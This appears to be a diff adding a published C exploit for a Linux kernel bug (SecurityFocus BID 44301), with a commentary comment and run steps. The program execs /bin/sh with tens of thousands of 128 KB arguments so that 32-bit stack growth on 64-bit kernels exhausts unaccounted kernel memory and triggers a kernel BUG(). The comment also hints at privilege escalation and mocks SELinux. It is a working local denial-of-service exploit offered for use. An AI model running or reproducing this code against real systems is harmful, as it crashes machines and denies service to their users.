@@ -1,0 +1,65 @@
+//source: http://www.securityfocus.com/bid/44301/info
+/* known for over a year, fixed in grsec
+   bug is due to a bad limit on the max size of the stack for 32bit apps
+   on a 64bit OS.   Instead of them being limited to 1/4th of a 32bit 
+   address space, they're limited to 1/4th of a 64bit address space -- oops!
+   in combination with vanilla ASLR, it triggers a BUG() as the stack 
+   tries to expand around the address space when shifted
+   Below mmap_min_addr you say? uh oh! ;)
+
+   Reported to Ted Tso in December 2009
+   Linus today (Aug 13 2010) silently fixes tangential issue:
+   http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=320b2b8de12698082609ebbc1a17165727f4c893
+
+   The second bug here is that the memory usage explodes within the 
+   kernel from a single 128k allocation in userland
+   The explosion of memory isn't accounted for by any task so it won't
+   be terminated by the OOM killer
+
+   curious what actual vuln was involved that they were trying
+   to silently fix, as I don't think it's the one below
+   clobbering data in a suid app by growing the stack into the mapping
+   for the image? ;)  I smell privesc...mumblings of X server/recursion
+
+   ulimit -s unlimited
+   ./64bit_dos
+
+   SELinux is here to save us though with its fine-grained controls!
+   Wait, it doesn't?
+   Clearly the solution is to throw a buggy KVM on top of it
+   Not enough?  Ok, we'll throw in an extra SELinux, that'll really 
+   throw those hackers off when they use the same exact exploit on the 
+   host as they do on the guest!
+   COMMON CRITERIA HERE I COME!
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/personality.h>
+
+#define NUM_ARGS 24550
+
+int main(void)
+{
+        char **args;
+        char *str;
+        int i;
+
+	/* not needed, just makes it easier for machines with less RAM */
+	personality(PER_LINUX32_3GB);
+
+        str = malloc(128 * 1024);
+        memset(str, 'A', 128 * 1024 - 1);
+        str[128 * 1024 - 1] = '\0';
+        args = malloc(NUM_ARGS * sizeof(char *));
+        for (i = 0; i < (NUM_ARGS - 1); i++)
+                args[i] = str;
+        args[i] = NULL;
+
+        execv("/bin/sh", args);
+        printf("execve failed\n");
+
+        return 0;
+}
